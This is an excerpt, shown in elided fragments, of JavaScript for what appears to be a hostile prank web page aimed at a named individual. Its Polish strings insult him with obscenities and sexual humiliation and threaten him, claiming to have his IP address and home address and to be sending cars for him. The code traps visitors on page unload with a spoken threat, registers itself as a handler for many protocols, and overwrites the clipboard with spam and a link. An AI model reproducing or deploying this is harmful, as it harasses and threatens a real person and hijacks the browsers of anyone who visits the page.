...
const SEARCHES = [
  'Czemu jakub juszko to kurwa jebana?',
  'Czemu johny anderson hackuje jakjusa?',
  'Ile jakub juszko ma cm w penisie?',
  'pornhub.com jakub juszko',
]
...
const PHRASES = [
  'JUSZKO TO KURWA! JUSZKO TO KURWA! JUSZKO TO KURWA! ',
  'JOHNY ANDERSON WAS KURWA MA WSZYSTKICH AHAHAHAHAH',
  'DZIEKI ZA IP HAHAHAHAH',
  'MAM TWÓJ ADRES KURWO JADE PO CIEBIE',
  '3 CZARNE MERCEDESY W DRODZE HAHAHAHAHAHAH',
  'SZCZAM NA CIEBIE KURWO'
]
...
function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    speak('KURWO NIE UCIEKAJ, DOJADE CIE')
...
function registerProtocolHandlers () {
  ...
  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'juszko popierduszko')
  })
}
...
function copySpamToClipboard () {
  const randomArt = getRandomArrayEntry(ART) + '\nlubie jesc banany https://haxfun.com'
...
function clipboardCopy (text) {
  const e =navigator.clipboard.writeText(text)
